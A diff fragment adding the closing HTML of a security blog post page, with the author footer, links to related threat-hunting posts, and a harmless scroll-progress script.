+    <div class="post-footer">
+      <div class="post-footer-author">
+        <img class="footer-avatar" src="../../src/avatar.jpg" alt="Garet P."/>
+        <div>
+          <div class="footer-author-name">Garet</div>
+          <div class="footer-author-role">SOC Analyst</div>
+        </div>
+      </div>
+      <a href="../index.html" class="back-to-blog">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+        All posts
+      </a>
+    </div>
+
+    <div class="related">
+      <div class="related-label">// related posts</div>
+      <div class="related-links">
+        <a href="hypothesis-driven-hunting.html" class="related-link">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+          Hypothesis-Driven Threat Hunting
+        </a>
+        <a href="hunt-program-outputs.html" class="related-link">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+          Hunt Program Outputs That Build the Program
+        </a>
+        <a href="triage-knowledge-transfer.html" class="related-link">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+          Triage Knowledge Transfer
+        </a>
+      </div>
+    </div>
+
+  </main>
+
+  <script>
+    window.addEventListener('scroll', () => {
+      const doc = document.documentElement;
+      document.getElementById('progress-bar').style.width =
+        (doc.scrollTop / (doc.scrollHeight - doc.clientHeight) * 100) + '%';
+    });
+  </script>
+
+</body>
+</html>
